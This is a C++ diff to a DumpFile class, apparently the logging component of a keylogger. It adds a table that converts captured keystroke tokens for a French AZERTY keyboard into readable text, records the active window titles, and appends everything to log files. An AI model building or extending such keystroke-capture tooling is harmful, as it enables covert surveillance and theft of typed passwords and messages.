@@ -1,3 +1,4 @@
+#include <boost/algorithm/string/predicate.hpp>
 #include "DumpFile.hh"
 
 DumpFile::DumpFile()
@@ -5,6 +6,34 @@ DumpFile::DumpFile()
   DEBUG_MSG("DumpFile created");
   _file = NULL;
   _name = "";
+
+  _translate["A"] = "a"; _translate["B"] = "b"; _translate["C"] = "c"; _translate["D"] = "d"; _translate["E"] = "e";
+  _translate["F"] = "f"; _translate["G"] = "g"; _translate["H"] = "h"; _translate["I"] = "i"; _translate["J"] = "j";
+  _translate["K"] = "k"; _translate["L"] = "l"; _translate["M"] = "m"; _translate["N"] = "n"; _translate["O"] = "o";
+  _translate["P"] = "p"; _translate["Q"] = "q"; _translate["R"] = "r"; _translate["S"] = "s"; _translate["T"] = "t";
+  _translate["U"] = "u"; _translate["V"] = "v"; _translate["W"] = "w"; _translate["X"] = "x"; _translate["Y"] = "y";
+  _translate["Z"] = "z"; _translate["[CTRL]"] = ""; _translate["[Right MENU]"] = "";
+  _translate["[SHIFT]A"] = "A"; _translate["[SHIFT]B"] = "B"; _translate["[SHIFT]C"] = "C";
+  _translate["[SHIFT]D"] = "D"; _translate["[SHIFT]E"] = "E"; _translate["[SHIFT]F"] = "F";
+  _translate["[SHIFT]G"] = "G"; _translate["[SHIFT]H"] = "H"; _translate["[SHIFT]I"] = "I";
+  _translate["[SHIFT]J"] = "J"; _translate["[SHIFT]K"] = "K"; _translate["[SHIFT]L"] = "L";
+  _translate["[SHIFT]M"] = "M"; _translate["[SHIFT]N"] = "N"; _translate["[SHIFT]O"] = "O";
+  _translate["[SHIFT]P"] = "P"; _translate["[SHIFT]Q"] = "Q"; _translate["[SHIFT]R"] = "R";
+  _translate["[SHIFT]S"] = "S"; _translate["[SHIFT]T"] = "T"; _translate["[SHIFT]U"] = "U";
+  _translate["[SHIFT]V"] = "V"; _translate["[SHIFT]W"] = "W"; _translate["[SHIFT]X"] = "X";
+  _translate["[SHIFT]Y"] = "Y"; _translate["[SHIFT]Z"] = "Z"; _translate["[ENTER]"] = "\n";
+  _translate["[SPACEBAR]"] = " "; _translate["[SHIFT][,]"] = "?"; _translate["[SHIFT]"] = "";
+  _translate["1"] = "&"; _translate["2"] = "e"; _translate["3"] = "\""; _translate["4"] = "'";
+  _translate["5"] = "("; _translate["6"] = "-"; _translate["7"] = "e"; _translate["8"] = "_";
+  _translate["9"] = "c"; _translate["0"] = "a"; _translate["[[{]"] = "_"; _translate["[+]"] = "=";
+  _translate["[SHIFT]1"] = "1"; _translate["[SHIFT]2"] = "2"; _translate["[SHIFT]3"] = "3"; _translate["[SHIFT]4"] = "4";
+  _translate["[SHIFT]5"] = "5"; _translate["[SHIFT]6"] = "6"; _translate["[SHIFT]7"] = "7"; _translate["[SHIFT]8"] = "8";
+  _translate["[SHIFT]9"] = "9"; _translate["[SHIFT]0"] = "0"; _translate["[SHIFT][[{]"] = "[petit o]"; _translate["[SHIFT][+]"] = "+";
+  _translate["[Right MENU]"] = "[Alt Gr]"; _translate["[Left MENU]"] = "[Alt]";
+  _translate["[Applications key (Natural keyboard)]"] = "[Menu]";
+  _translate["[Right MENU]1"] = ""; _translate["[Right MENU]2"] = "~"; _translate["[Right MENU]3"] = "#"; _translate["[Right MENU]4"] = "{";
+  _translate["[Right MENU]5"] = "["; _translate["[Right MENU]6"] = "|"; _translate["[Right MENU]7"] = "`"; _translate["[Right MENU]8"] = "\\";
+  _translate["[Right MENU]9"] = ""; _translate["[Right MENU]0"] = "@"; _translate["[Right MENU][[{]"] = "]"; _translate["[Right MENU][+]"] = "}";
 }
 
 DumpFile::~DumpFile()
@@ -26,9 +55,7 @@ void		DumpFile::createFile(const std::string &str)
   _name = str;
   file = isDirectoryExist("Logs") ? "Logs/" : "";
   file += str;
-  file += "-";
-  file += getTime();
-  _file = new std::ofstream(file.c_str(), std::ofstream::out);
+  _file = new std::ofstream(file.c_str(), std::ofstream::out | std::ofstream::app);
 }
 
 bool		DumpFile::checkFileExist() const
@@ -60,24 +87,35 @@ bool		DumpFile::isDirectoryExist(const std::string &dir) const
 
 bool		DumpFile::writePaquet(PaquetKeys *paquet)
 {
-  std::string active = "";
-  std::string text = "";
+  static std::string	active = "";
+  std::string	text = "";
+  char		*tmpText = 0;
+  char		*tmpActive = 0;
+  // static int	altgr = 0;
 
   if (!paquet)
     return false;
-  if (checkFileExist())
+  tmpActive = paquet->getActive();
+  tmpText = paquet->getTextDecoded();
+  if (checkFileExist() && tmpText)
     {
-      active = (paquet->getActive()) ? (paquet->getActive()) : (std::string());
-      text = (paquet->getText()) ? (paquet->getText()) : (std::string());
-      *_file << "PaquetKeys = {name: " << getName();
-      *_file << ", date: " << paquet->getDate();
-      *_file << ", sizeActive: " << active.size();
-      if (!active.empty())
-	*_file << ", active: " << active;
-      *_file << ", sizeText: " << text.size();
-      if (!text.empty())
-	*_file << ", text: " << text;
-      *_file << "}" << std::endl;
+      if (!boost::equals(active, tmpActive)) {
+	active = tmpActive;
+	*_file << std::endl << "[" << active << "]" << std::endl << std::endl; // Faudrait la date lisible avant le '['
+      }
+
+      text = tmpText;
+      auto translate = _translate.find(text);
+      if (translate != _translate.end()) {
+	text = translate->second;
+      }
+
+      // if (boost::starts_with(tmpText, "[Right MENU]") && std::string(tmpText).size() != 12 && altgr) {
+      *_file << text << std::ends << std::flush;
+      // }
+
+      // altgr = ((boost::starts_with(tmpText, "[Right MENU]") && std::string(tmpText).size() != 12) ? (!altgr) : (0));
+
       return true;
     }
   return false;
@@ -91,17 +129,17 @@ bool		DumpFile::writePaquet(PaquetMouse *paquet)
     return false;
   if (checkFileExist())
     {
-      active = (paquet->getActive()) ? (paquet->getActive()) : (std::string());
-      *_file << "PaquetMouse = {name: " << getName();
-      *_file << ", date: " << paquet->getDate();
-      *_file << ", sizeActive: " << active.size();
-      if (!active.empty())
-	*_file << ", active: " << active;
-      *_file << ", X: " << paquet->getX();
-      *_file << ", Y: " << paquet->getY();
-      *_file << ", Button: " << static_cast<int>(paquet->getButton());
-      *_file << ((paquet->getButton() == 1) ? ("(Left)") : ((paquet->getButton() == 2) ? ("(Middle)") : ("(Right)")));
-      *_file << "}" << std::endl;
+      // active = (paquet->getActive()) ? (paquet->getActive()) : (std::string());
+      // *_file << "PaquetMouse = {name: " << getName();
+      // *_file << ", date: " << paquet->getDate();
+      // *_file << ", sizeActive: " << active.size();
+      // if (!active.empty())
+      // 	*_file << ", active: " << active;
+      // *_file << ", X: " << paquet->getX();
+      // *_file << ", Y: " << paquet->getY();
+      // *_file << ", Button: " << static_cast<int>(paquet->getButton());
+      // *_file << ((paquet->getButton() == 1) ? ("(Left)") : ((paquet->getButton() == 2) ? ("(Middle)") : ("(Right)")));
+      // *_file << "}" << std::endl;
     }
   return false;
 }
